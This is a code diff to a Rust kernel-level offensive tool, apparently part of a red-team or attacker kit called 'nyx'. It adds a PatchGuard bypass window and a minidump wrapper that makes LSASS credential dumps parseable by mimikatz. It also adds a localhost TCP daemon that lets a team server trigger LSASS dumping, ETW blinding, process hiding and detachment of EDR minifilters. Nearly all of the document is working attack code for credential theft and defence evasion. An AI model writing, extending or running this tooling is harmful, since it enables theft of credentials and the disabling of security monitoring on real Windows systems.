@@ -19,6 +19,7 @@
 //!   nyx-kernel dump-lsass <pid>
 //!   nyx-kernel neutralize <pid> <freeze|choke|kill>
 //!   nyx-kernel detach-minifilter
+//!   nyx-kernel pg-window   # enter a PatchGuard unchecked window (holds until Ctrl+C)
 //!
 //! Build version is detected at runtime via RtlGetVersion — NO hardcoded build.
 //! All offsets come from the build table (`for_build`) or pattern scan.
@@ -29,14 +30,14 @@
 fn main() {
     use nyx_operator_kernelsdk::{
         win, CallbackKit, CredKit, EdrNeutralizeKit, EtwTiKit, KernelRw, MiniFilterKit,
-        NeutralizeMethod, PplKit, ProcHideKit,
+        NeutralizeMethod, PatchGuardKit, PplKit, ProcHideKit,
     };
 
     // ---- 1. Parse args ----
     let args: Vec<String> = std::env::args().collect();
     if args.len() < 2 {
         eprintln!(
-            "usage: nyx-kernel <bootstrap|blind-etw|hide<pid>|dump-lsass<pid>|neutralize<pid><m>|detach-minifilter> [...]"
+            "usage: nyx-kernel <bootstrap|blind-etw|hide<pid>|dump-lsass<pid>|neutralize<pid><m>|detach-minifilter|pg-window> [...]"
         );
         std::process::exit(1);
     }
@@ -129,6 +130,22 @@ fn main() {
         tier.neutralize.is_some(),
     );
 
+    // ---- 6a. Daemon mode: --serve <port> keeps the tier live and serves
+    // kernel ops over a local TCP socket (one persistent bootstrap session,
+    // avoiding re-bootstrap + re-pattern-scan per op). JSON line protocol:
+    //   {"op":"dump-lsass","pid":684}\n  → {"ok":true,"out_file":"lsass_684.dmp"}\n
+    //   {"op":"blind-etw"}               → {"ok":true}\n
+    //   {"op":"hide","pid":1234}         → {"ok":true}\n
+    //   {"op":"detach-minifilter"}       → {"ok":true}\n
+    // Backward-compatible: --serve absent → normal subcommand dispatch below.
+    if let Some(port_str) = args.iter().position(|a| a == "--serve").and_then(|i| args.get(i + 1)) {
+        if let Ok(port) = port_str.parse::<u16>() {
+            return run_daemon(tier, build, port);
+        }
+        eprintln!("[!] --serve needs a numeric port");
+        std::process::exit(1);
+    }
+
     // ---- 6. Dispatch the requested command ----
     match cmd.as_str() {
         "bootstrap" => {
@@ -170,14 +187,43 @@ fn main() {
         "dump-lsass" => {
             let pid = parse_pid(&args, 2);
             if let Some(cred) = &tier.cred {
-                match cred.dump_lsass(&*tier.rw, pid) {
-                    Ok(bytes) => {
+                // Use dump_lsass_with_base so we get the captured VA — needed
+                // to wrap the raw bytes in a minidump envelope mimikatz parses.
+                match cred.dump_lsass_with_base(&*tier.rw, pid) {
+                    Ok((bytes, base_va)) => {
                         let path = format!("lsass_{pid}.dmp");
-                        match std::fs::write(&path, &bytes) {
-                            Ok(()) => {
-                                eprintln!("[+] LSASS dumped: {path} ({} bytes)", bytes.len())
+                        if base_va == 0 {
+                            // The cred kit didn't resolve the base (floor impl
+                            // or a probe failure). Write raw bytes + warn.
+                            eprintln!(
+                                "[!] base VA unresolved — writing RAW bytes (not a minidump). \
+                                 mimikatz will reject this; supply a kernel kit that resolves \
+                                 ImageBaseAddress."
+                            );
+                            match std::fs::write(&path, &bytes) {
+                                Ok(()) => eprintln!(
+                                    "[+] LSASS raw bytes: {path} ({} bytes)",
+                                    bytes.len()
+                                ),
+                                Err(e) => eprintln!("[!] write failed: {e}"),
                             }
-                            Err(e) => eprintln!("[!] write failed: {e}"),
+                        } else {
+                            // Wrap the raw bytes in a minidump envelope.
+                            let dump = nyx_minidump_assembler::assemble_minidump(
+                                pid,
+                                base_va,
+                                &bytes,
+                                build,
+                            );
+                            match std::fs::write(&path, &dump) {
+                                Ok(()) => eprintln!(
+                                    "[+] LSASS minidump: {path} ({} bytes raw + envelope, \
+                                     base_va=0x{base_va:x}, build={build}). \
+                                     Parse with mimikatz `sekurlsa::logonpasswords`.",
+                                    dump.len()
+                                ),
+                                Err(e) => eprintln!("[!] write failed: {e}"),
+                            }
                         }
                     }
                     Err(e) => {
@@ -230,6 +276,44 @@ fn main() {
                     "[!] minifilter kit not available (flt_globals_kva was 0 — supply --flt-rva)"
                 );
                 std::process::exit(5);
+            }
+        }
+
+        "pg-window" => {
+            // Enter a PatchGuard unchecked window. select_pg_window picks the
+            // best available bypass for the current build (RuntimePgBypass on
+            // Win11 24H2+, TimingRepair on Win10/early Win11). The window
+            // borrows tier.rw for the duration — we hold the guard until the
+            // operator signals completion, then Drop repairs PG state.
+            eprintln!("[*] selecting PatchGuard window for build {build}...");
+            let window_kind = if build >= 26100 { "RuntimePgBypass" } else { "TimingRepair" };
+            match win::select_pg_window(build, &*tier.rw) {
+                Some(kit) => {
+                    eprintln!("[+] selected {window_kind} window; entering unchecked window...");
+                    match kit.enter_unchecked(&*tier.rw) {
+                        Ok(_guard) => {
+                            eprintln!("[+] PatchGuard unchecked window OPEN — DKOM edits safe");
+                            eprintln!("[*] press ENTER to close the window (Drop repairs PG)...");
+                            // Block on stdin until the operator signals completion.
+                            // The guard lives until this closure returns; Drop runs on exit.
+                            let mut line = String::new();
+                            let _ = std::io::stdin().read_line(&mut line);
+                            eprintln!("[+] closing window — PG repair running on Drop");
+                            // _guard drops here, invoking the repair callback.
+                        }
+                        Err(e) => {
+                            eprintln!("[!] enter_unchecked failed (PG context not in safe state): {e:?}");
+                            eprintln!("    retry when PG is between validation cycles (~5min gap)");
+                            std::process::exit(5);
+                        }
+                    }
+                }
+                None => {
+                    eprintln!(
+                        "[!] no PatchGuard window available for build {build} (no PG-context offsets or not x86_64)"
+                    );
+                    std::process::exit(5);
+                }
             }
         }
 
@@ -288,6 +372,192 @@ fn detect_build() -> u32 {
     } else {
         0
     }
+}
+
+// ---- §P3.b Daemon mode: persistent kernel session over TCP ----
+//
+// One bootstrap (KslD/BYOVD load + resolve_offsets pattern scan) amortised
+// across many ops. JSON line protocol on localhost — the team server's
+// /api/lsass handler (P3.c) connects as a client and posts ops.
+
+/// Run the kernel-tier daemon: bind a localhost TCP socket, accept one
+/// connection at a time, and dispatch JSON ops against the live `tier`.
+/// Each op is a single line `{"op":"...","pid":N}`; the reply is a single
+/// line JSON `{"ok":true,...}` or `{"ok":false,"err":"..."}`.
+#[cfg(target_os = "windows")]
+fn run_daemon(
+    tier: nyx_operator_kernelsdk::KernelTier,
+    build: u32,
+    port: u16,
+) -> ! {
+    use nyx_operator_kernelsdk::{
+        CallbackKit, CredKit, EdrNeutralizeKit, EtwTiKit, KernelRw, MiniFilterKit, ProcHideKit,
+    };
+    use std::io::{BufRead, BufReader, Write};
+    use std::net::TcpListener;
+
+    let bind = format!("127.0.0.1:{port}");
+    let listener = match TcpListener::bind(&bind) {
+        Ok(l) => {
+            eprintln!("[+] nyx-kernel daemon listening on {bind} (build {build})");
+            l
+        }
+        Err(e) => {
+            eprintln!("[!] bind {bind} failed: {e}");
+            std::process::exit(6);
+        }
+    };
+
+    for stream in listener.incoming() {
+        let mut stream = match stream {
+            Ok(s) => s,
+            Err(e) => {
+                eprintln!("[!] accept failed: {e}");
+                continue;
+            }
+        };
+        let peer = stream
+            .peer_addr()
+            .map(|a| a.to_string())
+            .unwrap_or_else(|_| "?".into());
+        eprintln!("[*] daemon: client {peer} connected");
+        let reader = BufReader::new(stream.try_clone().expect("clone stream"));
+        for line in reader.lines() {
+            let line = match line {
+                Ok(l) => l,
+                Err(_) => break,
+            };
+            let trimmed = line.trim();
+            if trimmed.is_empty() {
+                continue;
+            }
+            let reply = dispatch_daemon_op(trimmed, &tier, build);
+            let reply_line = format!("{reply}\n");
+            if stream.write_all(reply_line.as_bytes()).is_err() {
+                break;
+            }
+            eprintln!("[*] daemon: {peer} → {trimmed} → {reply}");
+        }
+        eprintln!("[*] daemon: client {peer} disconnected");
+    }
+    // listener.incoming() only ends on error; unreachable in practice.
+    unreachable!("daemon listener loop exited");
+}
+
+/// Dispatch one daemon op. Tiny hand-rolled JSON parser (no serde dep) — we
+/// only recognise `op` (string) and `pid` (number). Returns a JSON reply line.
+#[cfg(target_os = "windows")]
+fn dispatch_daemon_op(line: &str, tier: &nyx_operator_kernelsdk::KernelTier, build: u32) -> String {
+    use nyx_operator_kernelsdk::{
+        CallbackKit, CredKit, EdrNeutralizeKit, EtwTiKit, KernelRw, MiniFilterKit, ProcHideKit,
+    };
+
+    let op = json_string_field(line, "op").unwrap_or_default();
+    let pid = json_number_field(line, "pid").unwrap_or(0);
+
+    match op.as_str() {
+        "dump-lsass" => {
+            if let Some(cred) = &tier.cred {
+                match cred.dump_lsass_with_base(&*tier.rw, pid) {
+                    Ok((bytes, base_va)) => {
+                        if base_va == 0 {
+                            return json_err("base VA unresolved — raw bytes only");
+                        }
+                        let dump = nyx_minidump_assembler::assemble_minidump(
+                            pid, base_va, &bytes, build,
+                        );
+                        let path = format!("lsass_{pid}.dmp");
+                        if std::fs::write(&path, &dump).is_err() {
+                            return json_err("write failed");
+                        }
+                        format!(
+                            r#"{{"ok":true,"out_file":"{path}","bytes":{},"base_va":"0x{:x}"}}"#,
+                            dump.len(), base_va
+                        )
+                    }
+                    Err(e) => json_err(&format!("dump_lsass: {e:?}")),
+                }
+            } else {
+                json_err("cred kit not assembled")
+            }
+        }
+        "blind-etw" => {
+            if let Some(etw) = &tier.etw_ti {
+                match etw.blind(&*tier.rw) {
+                    Ok(()) => json_ok(),
+                    Err(e) => json_err(&format!("blind-etw: {e:?}")),
+                }
+            } else {
+                json_err("etw_ti kit not assembled")
+            }
+        }
+        "hide" => {
+            if let Some(hide) = &tier.hide {
+                match hide.hide(&*tier.rw, pid) {
+                    Ok(()) => json_ok(),
+                    Err(e) => json_err(&format!("hide: {e:?}")),
+                }
+            } else {
+                json_err("hide kit not assembled")
+            }
+        }
+        "detach-minifilter" => {
+            if let Some(mf) = &tier.minifilter {
+                match mf.detach_edr(&*tier.rw) {
+                    Ok(()) => json_ok(),
+                    Err(e) => json_err(&format!("detach-minifilter: {e:?}")),
+                }
+            } else {
+                json_err("minifilter kit not assembled (supply --flt-rva)")
+            }
+        }
+        "status" => {
+            // Report which kits are live — useful for the team-server probe.
+            format!(
+                r#"{{"ok":true,"build":{build},"etw_ti":{},"minifilter":{},"hide":{},"cred":{}}}"#,
+                tier.etw_ti.is_some(),
+                tier.minifilter.is_some(),
+                tier.hide.is_some(),
+                tier.cred.is_some()
+            )
+        }
+        other => json_err(&format!("unknown op: {other}")),
+    }
+}
+
+/// Extract a JSON string field value `"key":"value"` → `value`. Tiny hand-rolled
+/// parser — avoids a serde dependency for the daemon's 4-op protocol.
+#[cfg(target_os = "windows")]
+fn json_string_field(line: &str, key: &str) -> Option<String> {
+    let needle = format!("\"{key}\":\"");
+    let start = line.find(&needle)? + needle.len();
+    let rest = &line[start..];
+    let end = rest.find('"')?;
+    Some(rest[..end].to_string())
+}
+
+/// Extract a JSON number field value `"key":N` → N. Tiny hand-rolled parser.
+#[cfg(target_os = "windows")]
+fn json_number_field(line: &str, key: &str) -> Option<u32> {
+    let needle = format!("\"{key}\":");
+    let start = line.find(&needle)? + needle.len();
+    let rest = line[start..].trim_start();
+    let end = rest
+        .find(|c: char| !c.is_ascii_digit())
+        .unwrap_or(rest.len());
+    rest[..end].parse().ok()
+}
+
+#[cfg(target_os = "windows")]
+fn json_ok() -> String {
+    r#"{"ok":true}"#.to_string()
+}
+
+#[cfg(target_os = "windows")]
+fn json_err(msg: &str) -> String {
+    // Escape any embedded quotes in the message.
+    let escaped: String = msg.replace('\\', "\\\\").replace('"', "\\\"");
+    format!(r#"{{"ok":false,"err":"{escaped}"}}"#)
 }
 
 // ---- Helpers ----
